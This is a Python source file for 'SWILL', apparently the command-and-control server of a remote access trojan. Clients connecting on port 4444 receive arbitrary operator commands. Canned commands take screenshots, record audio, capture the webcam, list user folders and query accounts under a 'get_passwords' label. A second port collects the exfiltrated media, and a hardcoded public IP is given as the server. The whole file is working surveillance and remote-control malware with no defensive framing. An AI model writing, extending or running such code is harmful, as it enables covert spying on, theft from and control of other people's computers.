import socket
import threading
import os
import subprocess
from datetime import datetime

class SWILLServer:
    def __init__(self):
        self.host = '0.0.0.0'
        self.control_port = 4444
        self.media_port = 4445
        self.vnc_port = 5900
        self.clients = {}
        
    def start_control_server(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.control_port))
        server.listen(10)
        print(f"[SWILL] Control Server listening on {self.control_port}")
        print(f"[SWILL] Your IP: 92.115.78.187")
        
        while True:
            client_socket, client_address = server.accept()
            print(f"[SWILL] New connection from {client_address}")
            
            client_id = f"{client_address[0]}_{datetime.now().strftime('%H%M%S')}"
            self.clients[client_id] = {
                'socket': client_socket,
                'address': client_address,
                'connected_at': datetime.now()
            }
            
            client_thread = threading.Thread(
                target=self.handle_windows_client,
                args=(client_socket, client_address, client_id)
            )
            client_thread.daemon = True
            client_thread.start()
    
    def handle_windows_client(self, client_socket, client_address, client_id):
        try:
            client_socket.send(b"[SWILL] Connection established\n")
            
            while True:
                client_socket.send(b"SWILL> ")
                command = input(f"SWILL[{client_id}]> ")
                
                if command.lower() in ['exit', 'quit']:
                    client_socket.send(b'exit')
                    break
                elif command.lower() == 'vnc_connect':
                    self.connect_to_windows_vnc(client_address[0])
                    continue
                elif command.lower() == 'screenshot':
                    client_socket.send(b'screenshot')
                elif command.lower() == 'record_audio':
                    client_socket.send(b'record_audio 10')
                elif command.lower() == 'webcam_capture':
                    client_socket.send(b'webcam_capture')
                elif command.lower() == 'system_info':
                    client_socket.send(b'systeminfo')
                elif command.lower() == 'files_list':
                    client_socket.send(b'dir C:\\Users')
                elif command.lower() == 'get_passwords':
                    client_socket.send(b'powershell "Get-LocalUser | Format-Table Name, Enabled"')
                else:
                    client_socket.send(command.encode())
                
                response = client_socket.recv(8192).decode('utf-8', errors='ignore')
                print(f"\n[RESPONSE]:\n{response}")
                
        except Exception as e:
            print(f"[SWILL] Client error: {e}")
        finally:
            client_socket.close()
            if client_id in self.clients:
                del self.clients[client_id]
    
    def connect_to_windows_vnc(self, windows_ip):
        try:
            print(f"[SWILL] Connecting to VNC at {windows_ip}:{self.vnc_port}")
            os.system(f"vncviewer {windows_ip}:{self.vnc_port} &")
        except Exception as e:
            print(f"[SWILL] VNC error: {e}")
    
    def start_media_server(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.media_port))
        server.listen(5)
        print(f"[SWILL] Media Server listening on {self.media_port}")
        
        while True:
            client_socket, client_address = server.accept()
            print(f"[SWILL] Media connection from {client_address}")
            
            media_thread = threading.Thread(
                target=self.handle_media_client,
                args=(client_socket, client_address)
            )
            media_thread.daemon = True
            media_thread.start()
    
    def handle_media_client(self, client_socket, client_address):
        try:
            data_type = client_socket.recv(1024).decode().strip()
            print(f"[SWILL] Receiving {data_type} from {client_address}")
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            
            if "AUDIO" in data_type:
                filename = f"audio_{timestamp}.wav"
                with open(filename, 'wb') as f:
                    while True:
                        data = client_socket.recv(4096)
                        if not data or b'[END]' in data:
                            f.write(data.replace(b'[END]', b''))
                            break
                        f.write(data)
                print(f"[SWILL] Audio saved: {filename}")
                
            elif "PHOTO" in data_type or "SCREEN" in data_type:
                ext = "jpg" if "PHOTO" in data_type else "png"
                filename = f"{data_type.lower()}_{timestamp}.{ext}"
                with open(filename, 'wb') as f:
                    while True:
                        data = client_socket.recv(4096)
                        if not data or b'[END]' in data:
                            f.write(data.replace(b'[END]', b''))
                            break
                        f.write(data)
                print(f"[SWILL] File saved: {filename}")
                
        except Exception as e:
            print(f"[SWILL] Media error: {e}")
        finally:
            client_socket.close()
    
    def show_clients(self):
        print("\n[SWILL] Connected Clients:")
        for client_id, info in self.clients.items():
            print(f"  {client_id} - {info['address']}")
    
    def start(self):
        print("[SWILL] Starting SWILL Server...")
        print("[SWILL] Server IP: 92.115.78.187")
        
        control_thread = threading.Thread(target=self.start_control_server)
        media_thread = threading.Thread(target=self.start_media_server)
        
        control_thread.daemon = True
        media_thread.daemon = True
        
        control_thread.start()
        media_thread.start()
        
        try:
            while True:
                print("\n[SWILL] Commands: list, vnc <ip>, exit")
                cmd = input("SWILL-SERVER> ")
                
                if cmd == "list":
                    self.show_clients()
                elif cmd.startswith("vnc "):
                    ip = cmd.split(" ")[1]
                    self.connect_to_windows_vnc(ip)
                elif cmd == "exit":
                    break
                    
        except KeyboardInterrupt:
            print("\n[SWILL] Shutting down...")

if __name__ == "__main__":
    server = SWILLServer()
    server.start()
